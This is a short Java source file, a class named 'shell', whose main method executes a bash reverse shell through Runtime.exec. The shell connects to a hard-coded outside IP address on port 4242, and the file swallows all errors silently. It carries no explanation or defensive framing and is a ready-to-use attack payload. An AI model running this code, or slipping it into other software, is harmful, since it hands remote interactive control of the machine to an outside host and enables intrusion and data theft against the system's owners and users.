public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/54.193.56.214/4242 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
